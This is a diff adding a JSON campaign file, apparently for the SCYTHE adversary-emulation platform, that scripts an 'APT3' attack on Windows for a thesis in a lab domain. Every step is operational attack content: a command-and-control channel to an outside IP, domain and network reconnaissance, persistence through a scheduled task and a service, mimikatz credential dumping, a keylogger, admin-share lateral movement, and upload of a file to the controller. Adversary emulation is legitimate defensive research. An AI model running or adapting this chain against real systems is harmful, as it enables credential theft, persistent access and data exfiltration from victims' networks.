@@ -1,0 +1,198 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "APT3 campaign for thesis",
+        "display_name": "APT3-thesis",
+        "name": "APT3-thesis",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": {
+                    "--cp": "35.196.54.120:443",
+                    "--multipart": 10240,
+                    "--secure": true
+                },
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "request": "--load crypt",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "request": "--load file",
+                "type": "message"
+            },
+            "4": {
+                "module": "file",
+                "request": "--create --path \"C:\\Users\\Public\\text.exe\" --size 10MB --random",
+                "type": "message"
+            },
+            "5": {
+                "module": "run",
+                "request": "cmd /c whoami",
+                "type": "message"
+            },
+            "6": {
+                "module": "run",
+                "request": "schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGIN /run \"system\"",
+                "type": "message"
+            },
+            "7": {
+                "module": "run",
+                "request": "cmd /c net group \"domain admins\"",
+                "type": "message"
+            },
+            "8": {
+                "module": "run",
+                "request": "cmd /c net user",
+                "type": "message"
+            },
+            "9": {
+                "module": "run",
+                "request": "cmd /c ipconfig /all",
+                "type": "message"
+            },
+            "10": {
+                "module": "loader",
+                "request": "--load sysinfo",
+                "type": "message"
+            },
+            "11": {
+                "module": "run",
+                "request": "cmd /c netstat -ano",
+                "type": "message"
+            },
+            "12": {
+                "module": "loader",
+                "request": "--load persist",
+                "type": "message"
+            },
+            "13": {
+                "module": "persist",
+                "request": "--name apt3 --display apt3 --description APT3_campaign --path \"C:\\Windows\\System32\\apt3.exe\"",
+                "type": "message"
+            },
+            "14": {
+                "module": "loader",
+                "request": "--load mimikatz",
+                "type": "message"
+            },
+            "15": {
+                "module": "mimikatz",
+                "request": "--arglist SEKURLSA::LogonPasswords",
+                "type": "message"
+            },
+            "16": {
+                "module": "loader",
+                "request": "--load keylogger",
+                "type": "message"
+            },
+            "17": {
+                "module": "keylogger",
+                "request": "--start",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0009",
+                    "att&ck-technique:T1056"
+                ],
+                "type": "message"
+            },
+            "18": {
+                "module": "run",
+                "request": "cmd /c net view",
+                "type": "message"
+            },
+            "19": {
+                "module": "run",
+                "request": "cmd /c nltest /dclist:hackinglab.local",
+                "type": "message"
+            },
+            "20": {
+                "module": "run",
+                "request": "cmd /c net user",
+                "type": "message"
+            },
+            "21": {
+                "module": "run",
+                "request": "cmd /c net share",
+                "type": "message"
+            },
+            "22": {
+                "time": 10,
+                "type": "delay"
+            },
+            "23": {
+                "module": "loader",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "24": {
+                "module": "upsh",
+                "request": "--cmd \"New-PSDrive -name g -psprovider filesystem -root \\\\Jupiter\\C$\"",
+                "rtags": [
+                    "atomic",
+                    "att&ck",
+                    "att&ck-tactic:TA0008",
+                    "att&ck-technique:T1077"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "module": "loader",
+                "request": "--load search",
+                "type": "message"
+            },
+            "26": {
+                "module": "search",
+                "request": "--directory \"%userprofile%\" --filename * --recurse",
+                "type": "message"
+            },
+            "27": {
+                "module": "file",
+                "request": "--create --path \"%userprofile%\\Documents\\exfil.dat\" --size 500MB --random",
+                "type": "message"
+            },
+            "28": {
+                "module": "loader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "29": {
+                "module": "uploader",
+                "request": "--remotepath \"%userprofile%\\Documents\\exfil.dat\"",
+                "type": "message"
+            },
+            "30": {
+                "module": "keylogger",
+                "request": "--current\n",
+                "type": "message"
+            },
+            "31": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            },
+            "32": {
+                "module": "loader",
+                "request": "--load terminate",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
